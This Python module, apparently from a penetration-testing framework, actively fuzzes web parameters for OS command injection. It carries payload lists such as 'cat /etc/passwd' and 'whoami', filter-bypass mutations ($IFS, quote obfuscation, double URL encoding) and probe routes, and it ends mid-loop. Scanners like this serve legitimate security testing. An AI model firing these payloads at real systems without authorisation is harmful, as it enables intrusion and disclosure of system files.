"""
OS Command Injection (CMDi) Detection Engine and Collector.

Actively fuzzes discovered endpoint parameters (GET query parameters, POST form & JSON bodies,
path segments, and HTTP headers) for OS command injection vulnerabilities using AuthenticatedHttpClient.

Supports multi-technique detection:
1. Result-Based Detection (POSIX & Windows command execution signature matching and arithmetic canaries).
2. Time-Based Blind Differential Detection (delay calibration with >= 4.0s latency threshold).
3. Error-Based Detection (multi-shell error signature detection across Bash, Dash, Zsh, CMD, and PowerShell).
4. Separator & Bypass Mutation Engine (semicolons, pipes, ampersands, command substitutions,
   newlines %0a, URL/double-URL encoding, $IFS whitespace substitutions, inline quote obfuscations).
5. False Positive & Reflection Suppression (baseline subtraction and echo guards).

Emits high-confidence Evidence(category="command_injection"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import json
import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


class Severity(str, Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class CommandInjectionResult:
    """Represents the structured result of a command injection analysis."""
    technique: str  # "result_based", "time_blind", "error_based"
    payload: str
    parameter: str
    parameter_type: str  # "query", "body", "json", "path", "header"
    status_code: int = 200
    os_family: str = "generic"  # "posix", "windows", "generic"
    matched_pattern: str = ""
    snippet: str = ""
    severity: str = Severity.CRITICAL
    confidence: float = 0.95
    template_id: str = "cmdi"
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    shell_flavor: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# Regex Signatures Catalogs
# =============================================================================

# Result-Based OS Output Signatures
OS_RESULT_SIGNATURES: Dict[str, re.Pattern] = {
    # POSIX ID output: uid=0(root) gid=0(root) or uid=1000(app) gid=1000(app)
    "unix_id": re.compile(
        r"(?:uid=\d+\([a-zA-Z0-9_\-.]+\)\s+gid=\d+\([a-zA-Z0-9_\-.]+\)|uid=\d+\s+gid=\d+)",
        re.IGNORECASE,
    ),
    # POSIX passwd file content
    "unix_passwd": re.compile(
        r"root:[x*]:0:0:.*?:(?:/root|/bin/(?:bash|sh|zsh|dash|nologin))",
        re.MULTILINE,
    ),
    # POSIX uname output: Linux hostname 5.15.0-76-generic ...
    "unix_uname": re.compile(
        r"\b(?:Linux|Darwin|FreeBSD|OpenBSD|NetBSD|SunOS)\s+[\w\.\-]+\s+\d+\.\d+[\w\.\-]*",
        re.IGNORECASE,
    ),
    # POSIX whoami output (isolated username)
    "unix_whoami": re.compile(
        r"^(?:root|daemon|bin|nobody|www-data|nginx|apache|app|user|admin|ubuntu|ec2-user|runner)$",
        re.IGNORECASE | re.MULTILINE,
    ),
    # Windows whoami output: nt authority\system or DOMAIN\user
    "windows_whoami": re.compile(
        r"\b(?:nt authority\\(?:system|network service|local service)|[a-zA-Z0-9_\-\.]+\\[a-zA-Z0-9_\-\.]+)\b",
        re.IGNORECASE,
    ),
    # Windows ver output: Microsoft Windows [Version 10.0.19045.3324]
    "windows_ver": re.compile(
        r"Microsoft\s+Windows\s+\[Version\s+\d+\.\d+[\.\d+]*\]",
        re.IGNORECASE,
    ),
    # Windows set output: COMSPEC=C:\Windows\system32\cmd.exe
    "windows_set": re.compile(
        r"\b(?:COMSPEC=.*cmd\.exe|SystemRoot=C:\\Windows|OS=Windows_NT)\b",
        re.IGNORECASE,
    ),
    # Windows dir output: Volume Serial Number is ...
    "windows_dir": re.compile(
        r"(?:Volume in drive [A-Z] is|Volume Serial Number is [0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}|Directory of [A-Z]:\\)",
        re.IGNORECASE,
    ),
    # Windows ipconfig output: Windows IP Configuration
    "windows_ipconfig": re.compile(
        r"(?:Windows IP Configuration|Ethernet adapter|IPv4 Address[\.\s]+:)",
        re.IGNORECASE,
    ),
}

# Error-Based Shell Error Signatures
SHELL_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "unix_bash": [
        ("bash_not_found", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)\s*(?:line \d+:\s*)?[^:\n]+:\s*(?:command )?not found", re.IGNORECASE)),
        ("dash_not_found", re.compile(r"sh:\s*\d*:\s*[^:\n]+:\s*not found", re.IGNORECASE)),
        ("zsh_not_found", re.compile(r"zsh:\s*command not found:\s*[^:\n]+", re.IGNORECASE)),
        ("bash_syntax_error", re.compile(r"syntax error near unexpected token", re.IGNORECASE)),
        ("sh_syntax_error", re.compile(r"/bin/sh:\s*syntax error", re.IGNORECASE)),
        ("generic_syntax_error", re.compile(r"syntax error:\s*unexpected", re.IGNORECASE)),
        ("no_such_file", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)[^:\n]+:\s*No such file or directory", re.IGNORECASE)),
        ("permission_denied", re.compile(r"(?:/bin/(?:ba)?sh:|sh:)[^:\n]+:\s*Permission denied", re.IGNORECASE)),
        ("cannot_execute", re.compile(r"cannot execute binary file", re.IGNORECASE)),
    ],
    "windows_cmd": [
        ("cmd_not_recognized", re.compile(r"'[^']+' is not recognized as an internal or external command,\s*operable program or batch file", re.IGNORECASE)),
        ("cmd_syntax_incorrect", re.compile(r"The syntax of the command is incorrect\.", re.IGNORECASE)),
        ("cmd_path_not_found", re.compile(r"The system cannot find the (?:path|file) specified\.", re.IGNORECASE)),
        ("cmd_volume_incorrect", re.compile(r"The filename, directory name, or volume label syntax is incorrect\.", re.IGNORECASE)),
        ("cmd_access_denied", re.compile(r"Access is denied\.", re.IGNORECASE)),
    ],
    "windows_powershell": [
        ("ps_cmdlet_not_found", re.compile(r"The term '[^']+' is not recognized as the name of a cmdlet", re.IGNORECASE)),
        ("ps_command_not_found_exc", re.compile(r"CommandNotFoundException", re.IGNORECASE)),
        ("ps_parser_error", re.compile(r"ParseException|MissingExpressionAfterOperator", re.IGNORECASE)),
        ("ps_position_msg", re.compile(r"At line:\d+\s+char:\d+", re.IGNORECASE)),
    ],
}

# Base Result Commands Catalog
RESULT_COMMAND_PAYLOADS: List[Dict[str, Any]] = [
    # POSIX Identity & System Info
    {"cmd": "id", "os": "posix", "canary_type": "regex", "signature": "unix_id"},
    {"cmd": "whoami", "os": "posix", "canary_type": "regex", "signature": "unix_whoami"},
    {"cmd": "uname -a", "os": "posix", "canary_type": "regex", "signature": "unix_uname"},
    {"cmd": "cat /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},
    {"cmd": "head -n 1 /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},

    # POSIX Arithmetic Canary (28412 + 19283 = 47695)
    {"cmd": "expr 28412 + 19283", "os": "posix", "canary_type": "exact", "expected": "47695"},

    # Windows Identity & System Info
    {"cmd": "whoami", "os": "windows", "canary_type": "regex", "signature": "windows_whoami"},
    {"cmd": "ver", "os": "windows", "canary_type": "regex", "signature": "windows_ver"},
    {"cmd": "set", "os": "windows", "canary_type": "regex", "signature": "windows_set"},
    {"cmd": "dir C:\\", "os": "windows", "canary_type": "regex", "signature": "windows_dir"},
    {"cmd": "ipconfig", "os": "windows", "canary_type": "regex", "signature": "windows_ipconfig"},
]

# Base Time Delay Templates Catalog
DEFAULT_TIME_DELAY_PAYLOADS: List[Dict[str, Any]] = [
    # POSIX delay
    {"template": "sleep {delay}", "os": "posix"},
    {"template": "sleep {delay}s", "os": "posix"},
    {"template": "ping -c {delay} 127.0.0.1", "os": "posix"},

    # Windows delay
    {"template": "timeout /t {delay} /nobreak", "os": "windows"},
    {"template": "timeout /t {delay}", "os": "windows"},
    {"template": "ping -n {delay} 127.0.0.1", "os": "windows"},
    {"template": "powershell -c Start-Sleep -s {delay}", "os": "windows"},

    # Generic / Fallback
    {"template": "sleep {delay} || timeout /t {delay}", "os": "generic"},
]

# Base Error Trigger Payloads Catalog
DEFAULT_ERROR_TRIGGER_PAYLOADS: List[str] = [
    "; argus_nonexistent_cmd_xyz ;",
    "| argus_nonexistent_cmd_xyz",
    "& argus_nonexistent_cmd_xyz &",
    "`argus_nonexistent_cmd_xyz`",
    "$(argus_nonexistent_cmd_xyz)",
    ";;;",
    "|||",
    "&&&",
    "| '",
    '; "',
]

# Common Parameter Names for CMDi Fuzzing
COMMON_CMDI_PARAMS: Set[str] = {
    "ip", "host", "hostname", "domain", "target", "addr", "address",
    "cmd", "command", "exec", "run", "daemon", "query", "arg", "args",
    "file", "filename", "filepath", "path", "dir", "log", "output",
    "tool", "ping", "traceroute", "lookup", "url", "uri", "fetch", "q",
}

# Default Probe Routes for CMDi Discovery
DEFAULT_CMDI_PROBE_ROUTES: List[str] = [
    "/ping", "/api/ping",
    "/traceroute", "/api/traceroute",
    "/nslookup", "/api/dns",
    "/system/exec", "/api/system",
    "/admin/tools", "/api/tools",
    "/view_log", "/api/logs",
    "/download", "/export",
    "/backup", "/api/backup",
]


# =============================================================================
# Payload Generator with 8 Distinct Mutation Strategies
# =============================================================================

class CommandInjectionPayloadGenerator:
    """
    Generates base command injection payloads and applies 8 distinct separator &
    WAF bypass mutation strategies for result-based, time-based blind, and error-based detection.
    """

    def __init__(
        self,
        custom_result_payloads: Optional[List[Dict[str, Any]]] = None,
        custom_time_payloads: Optional[List[Dict[str, Any]]] = None,
        custom_error_payloads: Optional[List[str]] = None,
    ):
        self.custom_result_payloads = list(custom_result_payloads) if custom_result_payloads is not None else None
        self.custom_time_payloads = list(custom_time_payloads) if custom_time_payloads is not None else None
        self.custom_error_payloads = list(custom_error_payloads) if custom_error_payloads is not None else None

    # --- Base Payload Accessors ---

    def generate_result_payloads(self) -> List[Dict[str, Any]]:
        """Returns base result-based command payloads."""
        if self.custom_result_payloads is not None:
            return list(self.custom_result_payloads)
        return list(RESULT_COMMAND_PAYLOADS)

    def generate_time_payloads(self, delay: int = 5) -> List[Dict[str, Any]]:
        """Returns time-delay payload definitions configured with delay in seconds."""
        templates = self.custom_time_payloads if self.custom_time_payloads is not None else DEFAULT_TIME_DELAY_PAYLOADS
        payloads = []
        for entry in templates:
            tmpl = entry["template"]
            os_type = entry.get("os", "generic")
            payloads.append({
                "cmd": tmpl.format(delay=delay),
                "os": os_type,
                "delay": delay,
            })
        return payloads

    def generate_error_payloads(self) -> List[str]:
        """Returns base error-trigger payloads."""
        if self.custom_error_payloads is not None:
            return list(self.custom_error_payloads)
        return list(DEFAULT_ERROR_TRIGGER_PAYLOADS)

    # --- 8 Distinct Separator & Bypass Mutation Strategies ---

    def mutate_semicolons(self, cmd: str) -> List[str]:
        """
        Strategy 1: Semicolon Chaining.
        Sequential execution using semicolons.
        """
        return [
            f"; {cmd}",
            f"; {cmd} ;",
            f" ; {cmd}",
            f";; {cmd}",
            f"1; {cmd}",
            f"1; {cmd};",
        ]

    def mutate_pipes(self, cmd: str) -> List[str]:
        """
        Strategy 2: Pipe Chaining.
        Pipe and conditional OR execution.
        """
        return [
            f"| {cmd}",
            f"|| {cmd}",
            f" | {cmd} |",
            f" || {cmd} ||",
            f"1 | {cmd}",
            f"1 || {cmd}",
        ]

    def mutate_ampersands(self, cmd: str) -> List[str]:
        """
        Strategy 3: Ampersand Chaining.
        Background and conditional AND execution.
        """
        return [
            f"& {cmd}",
            f"&& {cmd}",
            f" & {cmd} &",
            f" && {cmd} &&",
            f"1 & {cmd}",
            f"1 && {cmd}",
        ]

    def mutate_substitution(self, cmd: str) -> List[str]:
        """
        Strategy 4: Command Substitution.
        Subshell evaluation via backticks and dollar-parens.
        """
        return [
            f"`{cmd}`",
            f"$({cmd})",
            f"`echo {cmd} | sh`",
            f"$(echo {cmd} | sh)",
            f"\"`{cmd}`\"",
            f"\"$({cmd})\"",
        ]

    def mutate_newlines(self, cmd: str) -> List[str]:
        """
        Strategy 5: Newline Separators.
        Line-break command separators (raw and URL-encoded).
        """
        return [
            f"\n{cmd}",
            f"\r\n{cmd}",
            f"%0a{cmd}",
            f"%0d%0a{cmd}",
            f"\n{cmd}\n",
            f"%0a{cmd}%0a",
        ]

    def mutate_url_encoding(self, payload: str) -> List[str]:
        """
        Strategy 6: URL / Double URL Encoding.
        Percent-encoding separator characters to bypass basic input filters.
        """
        single_enc = urllib.parse.quote(payload, safe="")
        double_enc = urllib.parse.quote(single_enc, safe="")
        return [single_enc, double_enc]

    def mutate_whitespace(self, cmd: str) -> List[str]:
        """
        Strategy 7: Whitespace Substitutions.
        Replacing spaces using $IFS, ${IFS}, $IFS$9, %09 (tab), or +.
        """
        if " " not in cmd:
            return [cmd]
        return [
            cmd.replace(" ", "${IFS}"),
            cmd.replace(" ", "$IFS$9"),
            cmd.replace(" ", "%09"),
            cmd.replace(" ", "+"),
        ]

    def mutate_inline_quotes(self, cmd: str) -> List[str]:
        """
        Strategy 8: Inline Quote Obfuscation.
        Inserts single/double quotes or backslashes into the command token.
        """
        parts = cmd.split(" ", 1)
        base = parts[0]
        rest = (" " + parts[1]) if len(parts) > 1 else ""

        single_q = "".join(f"'{c}'" if c.isalpha() else c for c in base) + rest
        double_q = "".join(f'"{c}"' if c.isalpha() else c for c in base) + rest
        backslash = "".join(f"\\{c}" if c.isalpha() and i % 2 == 1 else c for i, c in enumerate(base)) + rest
        return [single_q, double_q, backslash]

    def generate_mutated_payloads(self, base_cmd: str) -> List[str]:
        """
        Generates a comprehensive, deduplicated list of mutated payloads for a given base command
        using all separator, substitution, newline, whitespace, quote, and encoding strategies.
        """
        variants: List[str] = [base_cmd]

        # 1. Separator mutations
        for fn in [
            self.mutate_semicolons,
            self.mutate_pipes,
            self.mutate_ampersands,
            self.mutate_substitution,
            self.mutate_newlines,
        ]:
            variants.extend(fn(base_cmd))

        # 2. Whitespace variations for multi-word commands
        ws_variants = []
        for v in list(variants):
            if " " in v:
                ws_variants.extend(self.mutate_whitespace(v))
        variants.extend(ws_variants)

        # 3. Quote obfuscation for single-word command bases
        quote_variants = []
        for q_cmd in self.mutate_inline_quotes(base_cmd):
            if q_cmd != base_cmd:
                quote_variants.append(f"; {q_cmd}")
                quote_variants.append(f"| {q_cmd}")
                quote_variants.append(f"& {q_cmd}")
                quote_variants.append(f"$({q_cmd})")
                quote_variants.append(f"%0a{q_cmd}")
        variants.extend(quote_variants)

        # 4. URL encoding variations for top separators
        url_enc_variants = []
        for v in variants[:15]:
            url_enc_variants.extend(self.mutate_url_encoding(v))
        variants.extend(url_enc_variants)

        # Deduplicate preserving order
        seen = set()
        unique_variants: List[str] = []
        for item in variants:
            if item and item not in seen:
                seen.add(item)
                unique_variants.append(item)

        return unique_variants


# =============================================================================
# Command Injection Analyzer
# =============================================================================

class CommandInjectionAnalyzer:
    """
    Evaluates HTTP responses for genuine OS command injection vulnerabilities across:
    1. Result-Based Detection (POSIX/Windows OS signatures and arithmetic canaries).
    2. Time-Based Blind Differential Analysis (latency delta >= 4.0s vs baseline).
    3. Error-Based Detection (Bash/Dash/Zsh, Windows CMD, and PowerShell error signatures).
    4. False Positive & Reflection Suppression.
    """

    GENERIC_BENIGN_TITLES = re.compile(
        r"<title>[^<]*(?:error|exception|not found|bad request|forbidden|server error|search)[^<]*</title>",
        re.IGNORECASE,
    )

    def analyze_result_based(
        self,
        response: Optional[HttpResponse],
        baseline: Optional[HttpResponse],
        payload_info: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes response for result-based command execution output signatures or arithmetic canaries.
        """
        if not response or not response.raw_body:
            return None

        body_str = str(response.raw_body)
        baseline_body = str(baseline.raw_body) if baseline and baseline.raw_body else ""
        canary_type = payload_info.get("canary_type", "regex")
        cmd = payload_info.get("cmd", "")

        # 1. Arithmetic Canary Exact Match (e.g., expr 28412 + 19283 -> 47695)
        if canary_type == "exact":
            expected = str(payload_info.get("expected", ""))
            if expected and expected in body_str:
                # Baseline subtraction: ensure expected result was NOT already present in baseline
                if expected not in baseline_body:
                    # Reflection guard: if only the arithmetic expression itself was reflected without result
                    return {
                        "technique": "result_based",
                        "template_id": "cmdi",
                        "severity": Severity.CRITICAL,
                        "confidence": 0.95,
                        "os_family": payload_info.get("os", "posix"),
                        "matched_pattern": f"exact_canary:{expected}",
                        "snippet": f"Found computed arithmetic canary '{expected}' from command '{cmd}'",
                        "payload": cmd,
                    }
            return None

        # 2. Regex Output Signatures Match
        sig_name = payload_info.get("signature", "")
        signatures_to_check: List[Tuple[str, re.Pattern]] = []

        if sig_name and sig_name in OS_RESULT_SIGNATURES:
            signatures_to_check.append((sig_name, OS_RESULT_SIGNATURES[sig_name]))
        else:
            # Check all result signatures
            signatures_to_check.extend(OS_RESULT_SIGNATURES.items())

        for name, pattern in signatures_to_check:
            match = pattern.search(body_str)
            if match:
                snippet = match.group(0)

                # Baseline subtraction: if the same match already existed in the baseline, suppress
                if baseline_body and pattern.search(baseline_body):
                    continue

                # Reflection Guard: if the matched snippet is just the verbatim command or input reflection
                if self._is_verbatim_reflection(body_str, cmd, snippet):
                    continue

                os_family = "windows" if name.startswith("windows_") else "posix"
                return {
                    "technique": "result_based",
                    "template_id": "cmdi",
                    "severity": Severity.CRITICAL,
                    "confidence": 0.95,
                    "os_family": os_family,
                    "matched_pattern": name,
                    "snippet": snippet[:200],
                    "payload": cmd,
                }

        return None

    def analyze_time_blind(
        self,
        injected_resp: Optional[HttpResponse],
        baseline_resp: Optional[HttpResponse],
        threshold: float = 4.0,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes timing differentials for time-based blind command injection.
        Requires delay differential >= threshold (default 4.0s) and total injected elapsed >= threshold.
        """
        if not injected_resp:
            return None

        baseline_elapsed = getattr(baseline_resp, "elapsed", 0.0) if baseline_resp else 0.0
        injected_elapsed = getattr(injected_resp, "elapsed", 0.0)
        delay_delta = injected_elapsed - baseline_elapsed

        if delay_delta >= threshold and injected_elapsed >= threshold:
            return {
                "technique": "time_blind",
                "template_id": "cmdi",
                "severity": Severity.CRITICAL,
                "confidence": 0.95,
                "delay_delta": delay_delta,
                "baseline_elapsed": baseline_elapsed,
                "injected_elapsed": injected_elapsed,
                "snippet": (
                    f"Response latency increased by {delay_delta:.2f}s "
                    f"(baseline: {baseline_elapsed:.2f}s, injected: {injected_elapsed:.2f}s, threshold: {threshold:.1f}s)"
                ),
            }

        return None

    def analyze_error_based(
        self,
        response: Optional[HttpResponse],
        baseline: Optional[HttpResponse],
        payload: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes response for OS shell error messages (Bash, Dash, Zsh, CMD, PowerShell).
        """
        if not response or not response.raw_body:
            return None

        body_str = str(response.raw_body)
        baseline_body = str(baseline.raw_body) if baseline and baseline.raw_body else ""

        for shell_family, sig_list in SHELL_ERROR_SIGNATURES.items():
            for sig_name, pattern in sig_list:
                match = pattern.search(body_str)
                if match:
                    snippet = match.group(0)

                    # Baseline subtraction: ignore if the baseline response already contained this shell error
                    if baseline_body and pattern.search(baseline_body):
                        continue

                    # Reflection guard
                    if self._is_verbatim_reflection(body_str, payload, snippet):
                        continue

                    return {
                        "technique": "error_based",
                        "template_id": "cmdi",
                        "severity": Severity.HIGH,
                        "confidence": 0.90,
                        "shell_flavor": shell_family,
                        "matched_pattern": sig_name,
                        "snippet": snippet[:200],
                        "payload": payload,
                    }

        return None

    def is_false_positive(
        self,
        response: Optional[HttpResponse],
        payload: str,
        baseline: Optional[HttpResponse] = None,
    ) -> bool:
        """
        Determines if a response is a false positive (e.g. empty response, identical to baseline,
        or pure reflection of payload in normal text without command output).
        """
        if not response or not response.raw_body:
            return True

        body_str = str(response.raw_body).strip()
        if len(body_str) < 5:
            return True

        if baseline and baseline.raw_body:
            if body_str == str(baseline.raw_body).strip():
                return True

        return False

    def _is_verbatim_reflection(self, body: str, payload: str, snippet: str) -> bool:
        """
        Checks if the matched snippet is solely due to the payload being echoed back
        in an HTML search heading, input field, or documentation string without OS execution.
        """
        if not payload or not snippet:
            return False
        clean_payload = payload.strip()
        clean_snippet = snippet.strip()

        # If snippet exactly equals payload and no actual execution markers exist
        if clean_snippet == clean_payload and not any(
            marker in clean_snippet for marker in ("uid=", "root:", "Microsoft Windows", "Linux ")
        ):
            return True

        return False


# =============================================================================
# Command Injection Collector Implementation
# =============================================================================

class CommandInjectionCollector(BaseCollector):
    """
    ARGUS Collector for active OS Command Injection (CMDi) detection.
    Fuzzes GET query parameters, POST body fields (form and JSON), path segments,
    and HTTP headers using AuthenticatedHttpClient.
    """

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        timeout: float = 15.0,
        delay_threshold: float = 4.0,
    ):
        self.http_client = http_client
        self.timeout = timeout
        self.delay_threshold = delay_threshold
        self.generator = CommandInjectionPayloadGenerator()
        self.analyzer = CommandInjectionAnalyzer()

    def _extract_candidate_endpoints(self, raw_mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts and normalizes target endpoints from mission state or constructs
        standard probe routes against discovered live hosts and target URL.
        """
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        # 1. Inspect mission.endpoints
        endpoints = getattr(raw_mission, "endpoints", []) or []
        for ep in endpoints:
            url = None
            method = "GET"
            params: Dict[str, Any] = {}
            body: Any = None
            headers: Dict[str, str] = {}

            if isinstance(ep, str):
                url = ep
            elif isinstance(ep, dict):
                url = ep.get("url") or ep.get("endpoint")
                method = ep.get("method", "GET").upper()
                params = ep.get("params") or {}
                body = ep.get("body")
                headers = ep.get("headers") or {}
            elif hasattr(ep, "url"):
                url = getattr(ep, "url")
                method = getattr(ep, "method", "GET")

            if url and isinstance(url, str) and url.startswith("http") and url not in seen_urls:
                seen_urls.add(url)
                parsed = urllib.parse.urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                candidates.append({
                    "url": url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "method": method,
                    "params": params,
                    "body": body,
                    "headers": headers,
                    "source": "mission.endpoints",
                })

        # 2. Inspect mission.live_hosts or mission.subdomains
        live_hosts = getattr(raw_mission, "live_hosts", []) or []
        target = getattr(raw_mission, "target", "") or ""
        host_urls: List[str] = []

        for lh in live_hosts:
            if isinstance(lh, str) and lh.startswith("http"):
                host_urls.append(lh)
            elif isinstance(lh, dict) and lh.get("url"):
                host_urls.append(lh["url"])
            elif isinstance(lh, str) and lh:
                host_urls.append(f"http://{lh}")

        if not host_urls and target:
            host_urls.append(target if target.startswith("http") else f"http://{target}")

        for base_url in host_urls:
            parsed_base = urllib.parse.urlparse(base_url)
            clean_base = f"{parsed_base.scheme}://{parsed_base.netloc}" if parsed_base.netloc else base_url
            if clean_base not in seen_urls and not candidates:
                seen_urls.add(clean_base)
                candidates.append({
                    "url": clean_base,
                    "base_url": clean_base,
                    "path": "/",
                    "method": "GET",
                    "params": {},
                    "body": None,
                    "headers": {},
                    "source": "live_host",
                })

            # If fewer than 5 candidate endpoints exist, seed with common probe routes
            if len(candidates) < 5:
                for route in DEFAULT_CMDI_PROBE_ROUTES[:4]:
                    probe_url = f"{clean_base.rstrip('/')}{route}"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": clean_base,
                            "path": route,
                            "method": "GET",
                            "params": {"ip": "127.0.0.1"},
                            "body": None,
                            "headers": {},
                            "source": "default_probe",
                        })

        return candidates

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Dispatches HTTP request using custom injected client or AuthenticatedHttpClient.
        """
        method = method.upper()
        try:
            if self.http_client is not None:
                if method == "GET" and hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(
                            mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.get(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.get(url)
                elif method == "POST" and hasattr(self.http_client, "post"):
                    try:
                        return self.http_client.post(
                            mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.post(mission, url, timeout=self.timeout)
                        except TypeError:
                            return self.http_client.post(url)
                elif hasattr(self.http_client, "request"):
                    try:
                        return self.http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.request(method, url)
                elif callable(self.http_client):
                    return self.http_client(url)
                return None

            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"CommandInjectionCollector request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active OS command injection fuzzing across discovered endpoints and parameters.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(raw_mission)
        if not candidates:
            logger.info("CommandInjectionCollector: No candidate endpoints or hosts to fuzz.")
            return []

        logger.info(f"CommandInjectionCollector: Fuzzing {len(candidates)} candidate endpoint(s)...")

        detected_evidence: List[Evidence] = []
        confirmed_vuln_keys: Set[str] = set()

        result_payload_entries = self.generator.generate_result_payloads()
        time_payload_entries = self.generator.generate_time_payloads(delay=5)
        error_payloads = self.generator.generate_error_payloads()

        for candidate in candidates:
            orig_url = candidate["url"]
            base_url = candidate["base_url"]
            parsed_url = urllib.parse.urlparse(orig_url)
            method = candidate.get("method", "GET")
            raw_params = candidate.get("params") or {}
            body_data = candidate.get("body")
            headers_data = dict(candidate.get("headers") or {})

            # 0. Measure Baseline
            start_base = time.time()
            baseline_resp = self._execute_request(
                mission=raw_mission,
                method=method,
                url=orig_url,
                params=raw_params if method == "GET" else None,
                data=body_data if method == "POST" and isinstance(body_data, dict) else None,
                headers=headers_data,
            )
            baseline_elapsed = getattr(baseline_resp, "elapsed", 0.0) if baseline_resp else (time.time() - start_base)

            # -------------------------------------------------------------
            # Vector 1: GET Query Parameters
            # -------------------------------------------------------------
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            if not query_params and raw_params and method == "GET":
                for k, v in raw_params.items():
                    query_params[k] = [str(v)]

            # If no parameters in URL but route is common command route and method is GET, test common params
            if not query_params and method == "GET" and (candidate.get("source") == "default_probe" or parsed_url.path in DEFAULT_CMDI_PROBE_ROUTES):
                query_params = {"ip": ["127.0.0.1"], "cmd": ["test"]}

            if query_params:
                for param_name in list(query_params.keys()):
                    param_vuln_found = False

                    # 1.1 Result-Based Fuzzing
                    for entry in result_payload_entries:
                        cmd = entry["cmd"]
                        mutated_variants = self.generator.generate_mutated_payloads(cmd)
                        # Test raw and top mutated variants
                        for payload in mutated_variants[:6]:
                            mut_query = dict(query_params)
                            mut_query[param_name] = [payload]
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                            ))

                            resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                            if not resp:
                                continue

                            analysis = self.analyzer.analyze_result_based(
                                response=resp,
                                baseline=baseline_resp,
                                payload_info=entry,
                            )
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    param_vuln_found = True
                                    break
                        if param_vuln_found:
                            break

                    # 1.2 Time-Based Blind Fuzzing
                    if not param_vuln_found:
                        for entry in time_payload_entries[:3]:
                            cmd = entry["cmd"]
                            mutated_variants = self.generator.generate_mutated_payloads(cmd)
                            for payload in mutated_variants[:4]:
                                mut_query = dict(query_params)
                                mut_query[param_name] = [payload]
                                target_url = urllib.parse.urlunparse((
                                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                                    parsed_url.params, urllib.parse.urlencode(mut_query, doseq=True), parsed_url.fragment,
                                ))

                                resp = self._execute_request(mission, "GET", target_url, headers=headers_data)
                                if not resp:
                                    continue

                                analysis = self.analyzer.analyze_time_blind(
                                    injected_resp=resp,
                                    baseline_resp=baseline_resp,
                                    threshold=self.delay_threshold,
                                )
                                if analysis:
                                    vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                    if vuln_key not in confirmed_vuln_keys:
                                        confirmed_vuln_keys.add(vuln_key)
                                        ev = self._create_evidence_and_update_state(
                                            mission=mission,
                                            target_url=target_url,
                                            base_url=base_url,
                                            param=param_name,
                                            param_type="query",
                                            payload=payload,
                                            status_code=getattr(resp, "status_code", 200) or 200,
                                            analysis=analysis,
                                        )
                                        detected_evidence.append(ev)
                                        param_vuln_found = True
                                        break
                            if param_vuln_found:
                                break

                    # 1.3 Error-Based Fuzzing
                    if not param_vuln_found:
                        for payload in error_payloads[:5]:
